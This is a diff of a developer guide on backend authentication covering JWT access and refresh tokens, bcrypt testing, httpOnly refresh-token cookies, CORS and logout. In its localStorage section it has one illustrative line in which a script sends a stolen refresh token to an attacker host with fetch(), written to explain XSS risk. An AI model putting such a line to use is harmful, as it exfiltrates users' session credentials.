@@ -1,15 +1,25 @@
 # Authentication & Security
 
 **Category:** Backend Development  
-**Last Updated:** December 9, 2025
+**Last Updated:** January 23, 2026  
+**Epic 13 Reference:** [Story 13.3 Authentication](../issue-implementation/epic-13-production-backend-architecture/story-13-3-authentication.md)
+
+## TL;DR Quick Reference
+
+```bash
+# Install
+npm install jsonwebtoken bcrypt cookie-parser
+
+# Pattern: Access token (15min) + Refresh token (7 days, httpOnly cookie)
+# Security: bcrypt cost 10, JWT rotation on refresh, HTTPS-only in prod
+```
 
 ---
 
 ## JWT Authentication (Access + Refresh Tokens)
 
-**When Adopted:** Epic 13 (Production Backend Architecture)  
-**Why:** Stateless auth, scalable, mobile-friendly  
-**Use Case:** Multi-session user authentication
+**Use Case:** Multi-session, cross-device auth for SPA + mobile  
+**Security:** Stateless, revocable via token rotation
 
 ### Minimal Example
 
@@ -105,6 +115,240 @@ app.post("/api/auth/login", async (req, res) => {
 });
 ```
 
+---
+
+## Security Service Testing Boundaries
+
+**Category:** Security & Testing  
+**Context:** Deciding what to mock in JWT/Password services
+
+When unit testing security infrastructure (like a `JwtService` or `PasswordService`), a critical architectural decision is whether to mock the underlying libraries (`jsonwebtoken`, `bcrypt`).
+
+### To Mock or Not to Mock?
+
+| Dependency         | Recommendation      | Reason                                                                                                                                                                                   |
+| :----------------- | :------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Bcrypt**         | **DO NOT MOCK**     | The utility of the test is verifying that the hashing and comparison logic works with real algorithms. Mocking `bcrypt.hash` to return `"fixed_string"` defeats the purpose of the test. |
+| **JWT Library**    | **DO NOT MOCK**     | You need to verify that tokens created by the service are actually parsable and have the correct expiration/claims.                                                                      |
+| **Key Management** | **MOCK ENV/SECRET** | Do not use production secrets. Provide test-specific secrets via dependency injection or a `.env.test` file.                                                                             |
+
+### The "Cost Factor" Tradeoff
+
+Using real `bcrypt` in tests comes with a performance penalty. Bcrypt is designed to be slow.
+
+- **Struggle**: Running 20+ password tests can add ~1s to the test suite.
+- **Solution**: For **unit tests** specifically, you can reduce the salt rounds (e.g., `rounds: 1`) in test environment to speed up execution, while keeping higher rounds for integration/production environments.
+
+### Boundary Checklist
+
+1.  Verify the service correctly handles **expired** tokens.
+2.  Verify the service rejects tokens signed with the **wrong secret**.
+3.  Verify the password validator rejects **common/weak** passwords.
+4.  Verify that sanitization logic (e.g., `sanitizeUser`) actually removes the hashed password from the object.
+
+---
+
+### httpOnly Cookies for Refresh Tokens (XSS Protection)
+
+**When Adopted:** Epic 13 Story 13.3  
+**Why:** Protect refresh tokens from XSS attacks; not accessible to JavaScript  
+**Use Case:** Production-grade authentication security
+
+#### Problem with localStorage
+
+Storing refresh tokens in localStorage exposes them to XSS attacks:
+
+```javascript
+// BAD: Vulnerable to XSS
+localStorage.setItem("refreshToken", token);
+
+// Malicious script can steal token:
+const stolen = localStorage.getItem("refreshToken");
+fetch("https://attacker.com/steal", { body: stolen });
+```
+
+#### Solution: httpOnly Cookies
+
+Store refresh tokens in httpOnly cookies (backend sets, JavaScript cannot access):
+
+```javascript
+// Backend: Set httpOnly cookie
+app.post("/api/v1/auth/login", async (req, res) => {
+  const { email, password } = req.body;
+
+  // ... validate credentials ...
+
+  const accessToken = generateAccessToken(user.id);
+  const refreshToken = generateRefreshToken(user.id);
+
+  // Set refresh token as httpOnly cookie
+  res.cookie("refreshToken", refreshToken, {
+    httpOnly: true, // Cannot be accessed by JavaScript
+    secure: process.env.NODE_ENV === "production", // HTTPS-only in production
+    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax", // CSRF protection
+    path: "/", // Available to all routes
+    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
+  });
+
+  // Return only access token (short-lived, can be in localStorage)
+  res.json({
+    accessToken, // Frontend stores this in localStorage (15min expiry = low risk)
+    user: { id: user.id, email: user.email },
+  });
+});
+
+// Backend: Read refresh token from cookie
+app.post("/api/v1/auth/refresh", async (req, res) => {
+  const refreshToken = req.cookies.refreshToken; // Read from cookie
+
+  if (!refreshToken) {
+    return res.status(401).json({ error: "No refresh token" });
+  }
+
+  try {
+    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
+    const newAccessToken = generateAccessToken(decoded.userId);
+
+    res.json({ accessToken: newAccessToken });
+  } catch (error) {
+    res.status(401).json({ error: "Invalid refresh token" });
+  }
+});
+```
+
+#### Frontend Configuration
+
+Frontend must include credentials in requests:
+
+```typescript
+// Frontend: All auth requests must include credentials
+fetch("/api/v1/auth/login", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  credentials: "include", // REQUIRED: Send cookies with request
+  body: JSON.stringify({ email, password }),
+});
+
+// OR: Configure fetch wrapper
+async function authFetch(url: string, options: RequestInit = {}) {
+  return fetch(url, {
+    ...options,
+    credentials: "include", // Always include cookies
+  });
+}
+```
+
+#### Backend CORS Configuration
+
+CORS must allow credentials and specify origin (no wildcard):
+
+```javascript
+import cors from "cors";
+
+// REQUIRED: Specific origin + credentials
+app.use(
+  cors({
+    origin: process.env.FRONTEND_URL || "http://localhost:5173", // Specific origin (not *)
+    credentials: true, // Allow cookies
+    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+    allowedHeaders: ["Content-Type", "Authorization"],
+  }),
+);
+
+// MUST install cookie-parser middleware
+import cookieParser from "cookie-parser";
+app.use(cookieParser());
+```
+
+#### Environment-Aware sameSite (Development Proxy)
+
+Development proxy (e.g., Vite localhost:5173 → localhost:3001) requires `sameSite: "lax"`:
+
+```javascript
+// Helper function for environment-aware cookie config
+const setRefreshTokenCookie = (res, token) => {
+  res.cookie("refreshToken", token, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    // Development: "lax" allows dev proxy (localhost:5173 → localhost:3001)
+    // Production: "strict" for maximum security
+    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
+    path: "/",
+    maxAge: 7 * 24 * 60 * 60 * 1000,
+  });
+};
+
+// Usage
+setRefreshTokenCookie(res, refreshToken);
+```
+
+#### Cookie Clearing (Logout)
+
+Clearing cookies requires **exact matching options**:
+
+```javascript
+// Helper: Clear cookie with EXACT matching options
+const clearRefreshTokenCookie = (res) => {
+  res.clearCookie("refreshToken", {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
+    path: "/", // MUST match original cookie path
+  });
+};
+
+// Logout endpoint
+app.post("/api/v1/auth/logout", async (req, res) => {
+  // Delete session from database
+  await prisma.session.delete({ where: { token: req.cookies.refreshToken } });
+
+  // Clear cookie (MUST use matching options)
+  clearRefreshTokenCookie(res);
+
+  res.json({ success: true });
+});
+```
+
+#### Manual Cookie Parsing Fallback
+
+If `cookie-parser` middleware fails, add manual parsing:
+
+```javascript
+// Fallback: Manual cookie parsing
+const getRefreshToken = (req) => {
+  // Try cookie-parser first
+  if (req.cookies?.refreshToken) {
+    return req.cookies.refreshToken;
+  }
+
+  // Fallback: Parse manually
+  const cookieHeader = req.headers.cookie;
+  if (!cookieHeader) return null;
+
+  const cookies = cookieHeader.split(";").reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split("=");
+    acc[key] = value;
+    return acc;
+  }, {});
+
+  return cookies.refreshToken || null;
+};
+
+// Usage
+app.post("/api/v1/auth/refresh", async (req, res) => {
+  const refreshToken = getRefreshToken(req);
+  // ... rest of logic
+});
+```
+
+#### Key Security Benefits
+
+- **XSS Protection**: Refresh token inaccessible to JavaScript (even if attacker injects script)
+- **CSRF Protection**: `sameSite: strict` prevents cross-site request forgery
+- **Secure Transport**: `secure: true` ensures cookies only sent over HTTPS in production
+- **Short-Lived Access Tokens**: Even if access token stolen from localStorage, expires in 15min
+- **Token Rotation**: Delete old refresh token on refresh (limits damage if stolen)
+
 ### Key Lessons
 
 - Short-lived access tokens (15min), long-lived refresh (7d)
@@ -112,10 +356,15 @@ app.post("/api/auth/login", async (req, res) => {
 - Use bcrypt rounds: 10 for dev, 12+ for production
 - Rotate refresh tokens on use (optional but secure)
 - Store JWT secrets in environment variables
+- Use httpOnly cookies for refresh tokens (XSS protection)
+- sameSite "lax" for dev proxy, "strict" for production (environment-aware)
+- Cookie clear options must match set options (especially path)
+- CORS with credentials requires specific origin (never wildcard)
+- Frontend must use credentials: 'include' (send cookies)
 
 ### When to Use
 
-User authentication, API access control, mobile apps
+User authentication, API access control, mobile apps, production web apps requiring XSS protection
 
 ---
 
